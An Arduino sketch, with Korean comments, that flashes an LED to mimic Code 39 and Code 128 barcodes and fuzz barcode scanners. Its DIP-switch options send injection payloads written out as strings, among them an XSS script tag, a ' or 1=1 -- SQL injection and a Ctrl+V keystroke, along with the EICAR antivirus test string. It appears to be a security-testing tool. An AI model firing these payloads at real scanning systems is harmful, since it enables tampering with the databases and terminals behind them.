/*
 Flashing LED Barcode Fuzzing ver 0.330.8
 by
 An AhHyeon
 
 Inspired by my orange board and team crew "Park Bumjun"
 Thanks to Professor Lee. for some tips on idea
 
 This code will maybe not work if your barcode scanner is optical,
 maybe only pens and laser barcode readers work.
 
 You may have to playing with the timing (delay base).
 */

const int ledPin =  13;      // LED 꽂혀있는 핀번호 
// 변수 변경:
int delaybase = 25;
//100 펜리더는 100이 가장 좋은것 같은데? 아마도.
//20 또는 보다 큰값이 code 39와 레이저 리더에 잘인식될듯.....


#define STR_LENGTH 100 //500, Code 128 에는 100을 Code 39 에는 50
char BarcodeBuf[STR_LENGTH]="";
//char RevBarcodeBuf[STR_LENGTH]="";

//모든 코드 39는 버퍼가 1이라서 공백으로 종료함.
char* code39bars[]={
  "1113313111", "3113111131", "1133111131", "3133111111", "1113311131", "3113311111", "1133311111",
  "1113113131", "3113113111", "1133113111", "3111131131", "1131131131", "3131131111", "1111331131",
  "3111331111", "1131331111", "1111133131", "3111133111", "1131133111", "1111333111", "3111111331",
  "1131111331", "3131111311", "1111311331", "3111311311", "1131311311", "1111113331", "3111113311",
  "1131113311", "1111313311", "3311111131", "1331111131", "3331111111", "1311311131", "3311311111",
  "1331311111", "1311113131", "3311113111", "1331113111", "1313131111", "1313111311", "1311131311",
  "1113131311", "1311313111"
};

char* code128bars[]={
  "212222", "222122", "222221", "121223", "121322", "131222", "122213", "122312", "132212",
  "221213", "221312", "231212", "112232", "122132", "122231", "113222", "123122", "123221",
  "223211", "221132", "221231", "213212", "223112", "312131", "311222", "321122", "321221",
  "312212", "322112", "322211", "212123", "212321", "232121", "111323", "131123", "131321",
  "112313", "132113", "132311", "211313", "231113", "231311", "112133", "112331", "132131",
  "113123", "113321", "133121", "313121", "211331", "231131", "213113", "213311", "213131",
  "311123", "311321", "331121", "312113", "312311", "332111", "314111", "221411", "431111",
  "111224", "111422", "121124", "121421", "141122", "141221", "112214", "112412", "122114",
  "122411", "142112", "142211", "241211", "221114", "413111", "241112", "134111", "111242",
  "121142", "121241", "114212", "124112", "124211", "411212", "421112", "421211", "212141",
  "214121", "412121", "111143", "111341", "131141", "114113", "114311", "411113", "411311",
  "113141", "114131", "311141", "411131", "211412", "211214", "211232", "2331112"};


void setup() {
  pinMode(ledPin, OUTPUT);
  //for (int thispin=3; thispin <=10;thispin++){
  //  pinMode(thispin, INPUT_PULLUP); // 기본적으로 높음.
  //}
}

void loop()
{

  if (!digitalRead(3)){ //가장 간단한 테스트문자열
    SendUSingDIPChoice("abc123");
  }
  if (!digitalRead(4)){ //irongeek 님의 오래된 Shmoocon 2010 바코드
    SendUSingDIPChoice("e7e7f559-ce13-fd7f-baf0-9b4908dd1c73");
  }
  if (!digitalRead(5)){ //간단한 XSS 공격, 누가 바코드인데 정상적인 코드처럼 보이게 만들어서 힘들게 입력해?
    SendUSingDIPChoice("<script>alert(\"AhHyeon Was Here\")</script>");
  }
  if (!digitalRead(6)){ //간단한 바코드 SQL 인젝션공격
    SendUSingDIPChoice("' or 1=1 -- ");
  }
  if (!digitalRead(7)){//백신이 반응을 보이는지 테스트할 EICAR 문자열 
    SendUSingDIPChoice("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
  }
  if (!digitalRead(8)){
    Code128StringSend("TRY TO PASTE v",103); //v 는 128a 에서 Ctrl+V 코드임.
  }
  if (!digitalRead(9)){//몇몇 오래된 장비에 보내서 어떤 키입력으로 들어가는지 판단
    int points[]={
      64,65,66,67,68,69,70,71,72,73,74,75,75,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95        };
    Code128IntArrSend(points,  103,  31);
  }


  //아래 코드로 타이밍 작동 하는지 테스트
  /*
 char buf[6];
   Code128StringSend(strcat(TestString, itoa(delaybase, buf, 10)));

   delaybase++;
   if (delaybase>1000){
   delaybase=1;
   }
   */
}
void SendUSingDIPChoice(char *SomeString) {
  if (!digitalRead(10)) { //Code 128b 을 기본으로 보냄
    Code39StringSend(SomeString);
  }
  else {
    Code128StringSend(SomeString, 104); //104 는 128b 을 의미함, 103 은 a, 105 는 c
  }
}

//http://www.codeguru.com/forum/showthread.php?t=303185 와
//http://www.irongeek.com/i.php?page=security/barcode-flashing-led-fuzzer-bruteforcer-injector 를 기반으로 작성함.
//아직 사용안함
char* rev(char* str)
{
  int end= strlen(str)-1;
  int start = 0;
  while( start<end )
  {
    str[start] ^= str[end];
    str[end] ^=   str[start];
    str[start]^= str[end];
    ++start;
    --end;
  }
  return str;
}


int ASCIItoCode128Point(char Cvalue)// ASCII 코드 값을 코드 128 차트에 있는 값으로 변환
{
  int Ivalue=(int)Cvalue;
  if  (Ivalue == 32){
    return 0;
  }
  if (Ivalue >= 33 && Ivalue <= 126){
    return Ivalue-32;
  }
  if (Ivalue >= 145){
    return Ivalue-50;
  }
  if (Ivalue <= 31){ //아직 사용안함 Code 128a 가 필요할때 바로 사용할수 있을지도....?
    return Ivalue+64;
  }

}


int ASCIItoCode39Point(char Cvalue)// ASCII 값을 Code 39 차트에 있는 값으로 변환
{
  int Ivalue=(int)Cvalue;
  if (Ivalue >= 48 && Ivalue <= 57){
    return Ivalue-48;
  }
  if (Ivalue >= 65 && Ivalue <= 90){
    return Ivalue-55;
  }
  if (Ivalue >= 97 && Ivalue <= 122){
    return Ivalue-87;
  }
  switch (Cvalue) {
  case '-':
    return 36;
    break;
  case '.':
    return 37;
    break;
  case ' ':
    return 38;
    break;
  case '$':
    return 39;
    break;
  case '/':
    return 40;
    break;
  case '+':
    return 41;
    break;
  case '%':
    return 42;
    break;
  case '*':
    return 43;
    break;
  }
}


void UpperCase(char *SomeString) //사용하진 않지만 할수도 있는 code 39 부분
{
  int i;
  for (i = 0; SomeString[i]!='\0'; i++) {
    if  (SomeString[i] >= 97 && SomeString[i] <= 122){
      SomeString[i]=SomeString[i]-32;
    }
  }
}

void Code128StringSend(char *SomeString, int ver) //문자열 보냄. Ver 의  103 은  128a, 104 는 128b 그리고 105 는 128c
//Current code does not let you mix Code 128 versions
{
  int i;
  int CheckSum = Code128CheckSum(SomeString, ver); //104 means Code 128B
  BarcodeBuf[0] = '\0';
  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*100);

  strcat(BarcodeBuf, code128bars[ver]);//Code 128B start
  for (i = 0; SomeString[i]!='\0'; i++) {
    strcat(BarcodeBuf, code128bars[ASCIItoCode128Point(SomeString[i])]);
  }
  strcat(BarcodeBuf, code128bars[CheckSum]);  //Checksum
  strcat(BarcodeBuf, "2331112"); //Code 128 end
  FlashSeq(BarcodeBuf);
  //Serial.println(BarcodeBuf);
  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*25);


  FlashSeq(rev(BarcodeBuf)); //Playing it backard helps reliability
  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*100);
  //Serial.println(BarcodeBuf);
}

void Code128IntArrSend(int *SomeIntArr, int ver, int arsize) //Using this for some odd characters
//Send the string. Ver should be 103 for 128a, 104 for 128b and 105 for 128c
//Current code does not let you mix Code 128 versions
{
  int i;
  int CheckSum = Code128CheckSumInt(SomeIntArr, ver, arsize); //104 means Code 128B
  BarcodeBuf[0] = '\0';
  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*100);

  strcat(BarcodeBuf, code128bars[ver]);//Code 128B start
  for (i = 0; i<arsize; i++) {
    strcat(BarcodeBuf, code128bars[SomeIntArr[i]]);
  }
  strcat(BarcodeBuf, code128bars[CheckSum]);  //Checksum
  strcat(BarcodeBuf, "2331112"); //Code 128 end
  FlashSeq(BarcodeBuf);

  //Serial.println(BarcodeBuf);
  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*25);

  FlashSeq(rev(BarcodeBuf)); //Playing it backard helps reliability
  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*100);
  //Serial.println(BarcodeBuf);
}

int Code128CheckSum(char *SomeString, int variant)
{
  int i;
  long PointSum=variant;
  for (i = 0; SomeString[i]!='\0'; i++) {
    PointSum = PointSum + ((i+1)*ASCIItoCode128Point(SomeString[i]));
  }
  return PointSum%103;
}

int Code128CheckSumInt(int *SomeIntArr, int variant, int arsize)
{
  int i;
  long PointSum=variant;
  for (i = 0;  i<arsize; i++) {
    PointSum = PointSum + ((i+1)*SomeIntArr[i]);
  }
  return PointSum%103;
}

void Code39StringSend(char *SomeString)
{
  int i;
  BarcodeBuf[0] = '\0';
  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*100);

  strcat(BarcodeBuf, "1311313111");//Code 39 start
  for (i = 0; SomeString[i]!='\0'; i++) {
    strcat(BarcodeBuf, code39bars[ASCIItoCode39Point(SomeString[i])]);
  }
  strcat(BarcodeBuf, "1311313111"); //Code 39 end
  FlashSeq(BarcodeBuf);

  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*25);

  //Serial.println(BarcodeBuf);
  FlashSeq(rev(BarcodeBuf));//Playing it backard helps reliability

  //Turn on LED to read as white space
  digitalWrite(ledPin, LOW);
  delayMicroseconds(delaybase*100);
  //Serial.println(BarcodeBuf);
}

void FlashSeq(char *FlashMe) //I do the real work, and switch between black and white areas
{
  int i;
  int B = HIGH;
  for (i = 0; FlashMe[i] != '\0'; i++) {
    digitalWrite(ledPin, B);
    delayMicroseconds(delaybase*(((int)FlashMe[i])-48));
    B=!B;
  }

}
